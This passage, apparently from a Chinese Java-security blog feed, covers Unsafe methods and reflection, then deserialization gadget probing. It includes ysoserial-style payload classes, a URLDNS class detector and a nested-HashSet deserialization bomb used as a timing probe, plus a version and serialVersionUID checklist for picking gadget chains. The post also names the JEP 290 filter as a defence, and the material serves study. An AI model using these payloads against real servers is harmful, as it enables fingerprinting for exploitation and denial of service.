class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">compareAndSwapObject</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4, Object var5)</span>;<span class="comment">//CAS机制相关操作，对对象var1里偏移量为var2的变量进行CAS修改，var4为期待值，var5为修改值，返回修改结果。相同方法有compareAndSwapInt、compareAndSwapLong。</span></span><br></pre></td></tr></table></figure><h2 id="类加载方法"><a href="#类加载方法" class="headerlink" title="类加载方法"></a>类加载方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">shouldBeInitialized</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//判断var1类是否被初始。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">ensureClassInitialized</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//确保var1类已经被初始化。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineClass(String var1, <span class="type">byte</span>[] var2, <span class="type">int</span> var3, <span class="type">int</span> var4, ClassLoader var5, ProtectionDomain var6);<span class="comment">//定义一个类，用于动态的创建类。var1为类名，var2为类的文件数据字节数组，var3为var2的输入起点，var4为输入长度，var5为加载该类的加载器，var6为保护领域。返回创建后的类。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineAnonymousClass(Class&lt;?&gt; var1, <span class="type">byte</span>[] var2, Object[] var3);<span class="comment">//用于动态的创建匿名内部类。var1为需创建匿名内部类的类，var2为匿名内部类的文件数据字节数组，var3为修补对象。返回创建后的匿名内部类。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">allocateInstance</span><span class="params">(Class&lt;?&gt; var1)</span> <span class="keyword">throws</span> InstantiationException;<span class="comment">//创建var1类的实例，但是不会调用var1类的构造方法，如果var1类还没有初始化，则进行初始化。返回创建实例对象。</span></span><br></pre></td></tr></table></figure><h2 id="内存屏障方法"><a href="#内存屏障方法" class="headerlink" title="内存屏障方法"></a>内存屏障方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">loadFence</span><span class="params">()</span>;<span class="comment">//所有读操作必须在loadFence方法执行前执行完毕。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">storeFence</span><span class="params">()</span>;<span class="comment">//所有写操作必须在storeFence方法执行前执行完毕。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">fullFence</span><span class="params">()</span>;<span class="comment">//所有读写操作必须在fullFence方法执行前执行完毕。</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.cnblogs.com/gaofei200/p/13951764.html">https://www.cnblogs.com/gaofei200/p/13951764.html</a></p><p><a href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html">https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反射newInstance的使用方式</title>
      <link href="/2022/11/10/%E5%8F%8D%E5%B0%84newInstance%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
      <url>/2022/11/10/%E5%8F%8D%E5%B0%84newInstance%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="反射newInstance的使用方式"><a href="#反射newInstance的使用方式" class="headerlink" title="反射newInstance的使用方式"></a>反射newInstance的使用方式</h1><p>通过反射创建新的类示例，有两种方式：<br><code>Class.newInstance()</code><br><code>Constructor.newInstance()</code></p><hr><p>以下对两种调用方式给以比较说明：<br><code>Class.newInstance()</code> <strong>只能够调用无参的构造函数，即默认的构造函数；</strong><br><code>Class.newInstance()</code> <strong>要求被调用的构造函数是可见的，也即必须是public类型的;</strong> </p><hr><p><code>Constructor.newInstance()</code> <strong>可以根据传入的参数，调用任意构造构造函数。</strong> </p><p><code>Constructor.newInstance()</code> <strong>在特定的情况下，可以调用私有的构造函数。</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();<span class="comment">//获得构造函数</span></span><br><span class="line">m.setAccessible(<span class="literal">true</span>);<span class="comment">//设置构造函数为可访问</span></span><br></pre></td></tr></table></figure><hr><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect.newInstance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A&#x27;s constructor is called.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">A</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;a:&quot;</span> + a + <span class="string">&quot; b:&quot;</span> + b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect.newInstance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        B b=<span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;通过Class.NewInstance()调用私有构造函数:&quot;</span>);</span><br><span class="line">        b.newInstanceByClassNewInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot;通过Constructor.newInstance()调用私有构造函数:&quot;</span>);</span><br><span class="line">        b.newInstanceByConstructorNewInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*通过Class.NewInstance()创建新的类示例*/</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">newInstanceByClassNewInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">/*当前包名为reflect，必须使用全路径*/</span></span><br><span class="line">            A a=(A)Class.forName(<span class="string">&quot;reflect.newInstance.A&quot;</span>).newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;通过Class.NewInstance()调用私有构造函数【失败】&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*通过Constructor.newInstance()创建新的类示例*/</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">newInstanceByConstructorNewInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">/*可以使用相对路径，同一个包中可以不用带包路径*/</span></span><br><span class="line">            Class c=Class.forName(<span class="string">&quot;reflect.newInstance.A&quot;</span>);</span><br><span class="line">            <span class="comment">/*以下调用无参的、私有构造函数*/</span></span><br><span class="line">            Constructor c0=c.getDeclaredConstructor();</span><br><span class="line">            c0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            A a0=(A)c0.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*以下调用带参的、私有构造函数*/</span></span><br><span class="line">            Constructor c1=c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">int</span>.class,<span class="type">int</span>.class&#125;);</span><br><span class="line">            c1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            A a1=(A)c1.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">5</span>, <span class="number">6</span>&#125;);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>构造Java探测class反序列化gadget的思考</title>
      <link href="/2022/11/10/%E6%9E%84%E9%80%A0java%E6%8E%A2%E6%B5%8Bclass%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2022/11/10/%E6%9E%84%E9%80%A0java%E6%8E%A2%E6%B5%8Bclass%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="构造java探测class反序列化gadget的思考"><a href="#构造java探测class反序列化gadget的思考" class="headerlink" title="构造java探测class反序列化gadget的思考"></a>构造java探测class反序列化gadget的思考</h1><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&amp;mid=2247484178&amp;idx=1&amp;sn=228ccc3d624f2d64a6c1d51555c42eea&amp;chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8&amp;mpshare=1&amp;scene=23&amp;srcid=1231zSEsxQMxcrllvqoBgmcY&amp;sharer_sharetime=1640932147710&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">构造java探测class反序列化gadget</a></p><p>这篇文章是2021年最后一天读的，非常好。这让我对2022充满希望。谢谢师傅提供的好思路。</p><h2 id="urldns"><a href="#urldns" class="headerlink" title="urldns"></a>urldns</h2><p>通过urldns去判断是不是存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 生成我们需要的空类</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title function_">makeClass</span><span class="params">(String clazzName)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(clazzName);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">    ctClass.defrost();</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Authors(&#123; Authors.NOPOINT,Authors.C0NY1 &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FindClassByDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmds = command.split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(cmds.length != <span class="number">2</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;&lt;url&gt;|&lt;class name&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> cmds[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">clazzName</span> <span class="operator">=</span> cmds[<span class="number">1</span>];</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">        <span class="comment">// 以URL对象为key，以探测Class为value</span></span><br><span class="line">        ht.put(u, makeClass(clazzName));<span class="comment">//</span></span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如果环境没有dns解析就不行咯</strong></p><h2 id="Dos"><a href="#Dos" class="headerlink" title="Dos"></a>Dos</h2><p><a href="https://blog.csdn.net/fnmsd/article/details/115672540">https://blog.csdn.net/fnmsd/article/details/115672540</a></p><p><a href="https://blog.csdn.net/nevermorewo/article/details/100100048">https://blog.csdn.net/nevermorewo/article/details/100100048</a></p><p><a href="https://github.com/jbloch/effective-java-3e-source-code/blob/master/src/effectivejava/chapter12/item85/DeserializationBomb.java">https://github.com/jbloch/effective-java-3e-source-code/blob/master/src/effectivejava/chapter12/item85/DeserializationBomb.java</a></p><p><strong>通过构造特殊的多层嵌套HashSet，导致服务器反序列化的时间复杂度提升，消耗服务器所有性能，导致拒绝服务。在这个基础上，我选择消耗部分性能达到间接延时的作用，来探测class。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Authors(&#123; Authors.C0NY1 &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FindClassByBomb</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> depth;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(command.contains(<span class="string">&quot;|&quot;</span>))&#123;</span><br><span class="line">            String[] x = command.split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">            className = x[<span class="number">0</span>];</span><br><span class="line">            depth = Integer.valueOf(x[<span class="number">1</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            className = command;</span><br><span class="line">            depth = <span class="number">28</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">findClazz</span> <span class="operator">=</span> makeClass(className);</span><br><span class="line">        Set&lt;Object&gt; root = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">        Set&lt;Object&gt; s1 = root;</span><br><span class="line">        Set&lt;Object&gt; s2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; depth; i++) &#123;</span><br><span class="line">            Set&lt;Object&gt; t1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">            Set&lt;Object&gt; t2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">            t1.add(findClazz);<span class="comment">//不存在类就抛出异常</span></span><br><span class="line">            s1.add(t1);</span><br><span class="line">            s1.add(t2);</span><br><span class="line">            s2.add(t1);</span><br><span class="line">            s2.add(t2);</span><br><span class="line">            s1 = t1;</span><br><span class="line">            s2 = t2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>经过师傅的实战一般这个深度都在25到28之间，切记不要设置太大否则造成DOS。</p><p>不过可以通过jep290继续防御</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djdk.serialFilter=maxarray=100000;maxdepth=20</span><br></pre></td></tr></table></figure><h2 id="class-checklist"><a href="#class-checklist" class="headerlink" title="class checklist"></a>class checklist</h2><p>要想在实战中使用，我们就需要事先去制作一份class的checklist备用。下面我通过diff maven中央仓库的统计的结果。最新的checklist和gadget都更新到ysoserial-for-woodpecker项目。</p><p><strong>6.1 CommonsCollections</strong></p><p>必须存在类：org.apache.commons.collections.functors.ChainedTransformer</p><div class="table-container"><table><thead><tr><th style="text-align:center">版本范围</th><th style="text-align:center">漏洞版本</th><th style="text-align:center">判断类</th><th style="text-align:center">suid冲突</th></tr></thead><tbody><tr><td style="text-align:center">&gt;= 3.1 or = 20040616</td><td style="text-align:center">org.apache.commons.collections.list.TreeList</td><td style="text-align:center">是</td><td style="text-align:center">无</td></tr><tr><td style="text-align:center">&gt;= 3.2.2</td><td style="text-align:center">org.apache.commons.collections.functors.FunctorUtils$1</td><td style="text-align:center">否</td><td style="text-align:center">无</td></tr></tbody></table></div><p><strong>6.2 CommonsCollections4</strong></p><p>必须存在类：org.apache.commons.collections4.comparators.TransformingComparator</p><div class="table-container"><table><thead><tr><th style="text-align:center">版本范围</th><th style="text-align:center">漏洞版本</th><th style="text-align:center">判断类</th><th style="text-align:center">suid冲突</th></tr></thead><tbody><tr><td style="text-align:center">&gt;= 4.1</td><td style="text-align:center">否</td><td style="text-align:center">存在org.apache.commons.collections4.FluentIterable</td><td style="text-align:center">无</td></tr><tr><td style="text-align:center">4.0</td><td style="text-align:center">否</td><td style="text-align:center">不存在org.apache.commons.collections4.FluentIterable</td><td style="text-align:center">无</td></tr></tbody></table></div><p><strong>6.3 CommonsBeanutils</strong></p><p>必须存在类：org.apache.commons.beanutils.BeanComparator</p><div class="table-container"><table><thead><tr><th style="text-align:center">版本范围</th><th style="text-align:center">漏洞版本</th><th style="text-align:center">判断类</th><th style="text-align:center">suid冲突</th></tr></thead><tbody><tr><td style="text-align:center">&gt;= 1.9.0</td><td style="text-align:center">是</td><td style="text-align:center">存在org.apache.commons.beanutils.BeanIntrospector</td><td style="text-align:center">-2044202215314119608</td></tr><tr><td style="text-align:center">1.7.0 &lt;=  &lt;= 1.8.3</td><td style="text-align:center">是</td><td style="text-align:center">存在org.apache.commons.collections.Buffer</td><td style="text-align:center">-3490850999041592962</td></tr><tr><td style="text-align:center">&gt;= 1.6 or = 20030211.134440</td><td style="text-align:center">是</td><td style="text-align:center">存在org.apache.commons.beanutils.ConstructorUtils</td><td style="text-align:center">2573799559215537819</td></tr><tr><td style="text-align:center">&gt;= 1.5 or 20021128.082114 &gt; 1.4.1</td><td style="text-align:center">是</td><td style="text-align:center">存在org.apache.commons.beanutils.BeanComparator</td><td style="text-align:center">5123381023979609048</td></tr></tbody></table></div><p><strong>6.4 c3p0</strong></p><p>必须存在：org.apache.commons.beanutils.BeanComparator</p><div class="table-container"><table><thead><tr><th style="text-align:center">版本范围</th><th style="text-align:center">漏洞版本</th><th style="text-align:center">判断类</th><th style="text-align:center">suid冲突</th></tr></thead><tbody><tr><td style="text-align:center">0.9.5-pre9 ～ 0.9.5.5</td><td style="text-align:center">是</td><td style="text-align:center">存在com.mchange.v2.c3p0.test.AlwaysFailDataSource</td><td style="text-align:center">-2440162180985815128</td></tr><tr><td style="text-align:center">0.9.2-pre2-RELEASE ~ 0.9.5-pre8</td><td style="text-align:center">是</td><td style="text-align:center">不存在com.mchange.v2.c3p0.test.AlwaysFailDataSource</td><td style="text-align:center">7387108436934414104</td></tr></tbody></table></div><p>以c3p0为例子，我们判断的步骤应该是</p><ol><li><p>第一步判断com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase是否存在，若存在C3P0可用</p></li><li><p>第二步判断com.mchange.v2.c3p0.test.AlwaysFailDataSource是否存在，存在说明是高版本，suid切换-2440162180985815128。否则切换7387108436934414104 </p></li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li><p>Oracle jdk or Open jdk</p></li><li><p>是jre还是jdk</p></li><li><p>中间件类型（辅助构造回显/内存马）</p></li><li><p>使用的web框架</p></li><li><p>BCEL classloader是否存在  <strong>com.sun.org.apache.bcel.internal.util.ClassLoader</strong></p></li><li><p>判断java版本是否低于&lt;7u104（该版本可以00截断）</p></li><li><p>……</p></li></ol><p>本来想继续去寻找的可是有点累了，以后有时间去弄吧。。。。。respect </p><p>参考</p><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&amp;mid=2247484178&amp;idx=1&amp;sn=228ccc3d624f2d64a6c1d51555c42eea&amp;chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8&amp;mpshare=1&amp;scene=23&amp;srcid=1231zSEsxQMxcrllvqoBgmcY&amp;sharer_sharetime=1640932147710&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">构造java探测class反序列化gadget</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java反序列化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>typora写博客文章</title>
      <link href="/2022/11/10/%E6%B5%8B%E8%AF%95obsidian%E7%9A%84markdown%E8%AF%AD%E6%B3%95%E6%98%AF%E5%90%A6%E5%85%BC%E5%AE%B9%E4%BA%8Ehexo/"/>
      <url>/2022/11/10/%E6%B5%8B%E8%AF%95obsidian%E7%9A%84markdown%E8%AF%AD%E6%B3%95%E6%98%AF%E5%90%A6%E5%85%BC%E5%AE%B9%E4%BA%8Ehexo/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="46b3a3037e2545471f24cd4d293c7424e99ad2e707dc3584e5058edea324cd80">48e22157b1ef105701eba779d55791b94473791e743914b36adcaf48d5050f2b2005e371a10b73d013c4c54714aece0e090f85d79c253fd59744a0112d7cfb2d41133fd1f2d8fbf8f7e8a5e776633ddaa887781d2bfd0746955830bc917cef41cc1c6611eb13efacd4d27c163cf8f701eba37529e937a8a13158b20fc1dc533ba4e0ab12fa20e6c75590a99db6e335696b963f83c5ff58fbab454623381798850e745727e193712d84369bd15c6f4ba0b8996e5d6b68d8503d26bb7a07e5e7b4f4504648e5be960e7ea1135daaf1ec9550d56c78d0fd501feffdefcb8fe42132cb2cf9c4e169521c2fb5477aafdad9779793af924d516f1587f8f66d916ec80b0fa93eea0172cabf2d050564844d69cb365e8d6d0d396d74a3da05d1dbfebba9557d40a97d2fab1e34ad2bd055e58b5f30141e5c28a16821b356a3615ce9500ac0a66d0ff16c66a1e1131f207366a8a05c82a5ea4364852d79afb2d430ea07267ceeca22dbd6936d39de42945375fe066032fbd102f134ccf4657108101065d1aedfa7db3046042c8388f96b7311cd9cf230ac524b2e31d451f1464144e72ed05473666e87aaf06307af322aebcfb6376c04423d965cc884f29a69f8b4482d03189b8f492f72ef05679692de3bfc5bff9bdfd550dece246e6de6fed781ec98d09ee157adceac5d7ddc23e8371034b48cd8baf9a432a4e4ac9699ee012d43151807ccfbff70ee731f0d5b9f14f31aac6acd0c653fcd9eafb599fd3d387195169354aa8e9ed5d953a85c997b64f95f7398ef48bbd5c896e577dee8dd7b141a91fb95b6192d119a59bf2878fd72c7cf00b236fb33b783ed73d5722849606f8ca43388923b233366d6ca70a5d2061600f7f18fa9b2f12a6e0ca67c941dc338fe9aa662af49530b2c224a03cb37635b9213b1f25d69e0919300e2d547f665fd0a6e545ac01a704cb30f4727eeddc45d7b6543b43e891ba79f67684851c82efb4084f1111d4136065e5aba9b3c72401793f5fd155418e626511e68f134eff646867645ab7948dfddb3b5a9020b012da22dbbf0e4ee4f39966ee4064e5fbb2f119fb5d6543470cb4767325882f311cc0e62aaf1379efd1f459904dc50fb7daf7f5b4b659f85a4d2413cd40210cd026a62b03b2981e579019478e70ba48171de5db24687bf0f5f79740262ba42d663cfde6e10ba76c744a5915a851c8a6e612134fc07e80514b56551b8b3e2c5ba21362ff782594ff1735b66a84f87cb002208cff9766ca3d347d0ce5eb730691d620deab3040f0a1a10450f24e57aa9bd3dd1adf03ac5e67355daddcc3a90b91e998ab158d961d23f60127f845ac87c039e09e60b4375cabecb0a5d985d2921b4987b7cc0b4f547a2a92e773729e0c07c9499e05cb08eada1f031255c27608b09fcfb29d8f4c0905213116cbccbcdeba3e16c7fdcd237c9b83998b127071064780b853456f8e058952cab6b7237c98b2fbfd5fbf5daa2301ec54e6db2bffb1aaf37a05658f78b5d6e701b1891c09057110d09fde00dbf03ed27d46e130137d39ddd43e492abb5ea1dd6c97a23097ecb36022f048e8bc55053c8cee7808aa25d56b97d1d4f5eed0ab44b28152b171904fea1e591baafa60428cad1f83194d3da34ec7db7c859dd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> obsidian hexo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>深入学习tomcat</title>
      <link href="/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/"/>
      <url>/2022/11/10/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0tomcat/</url>
      
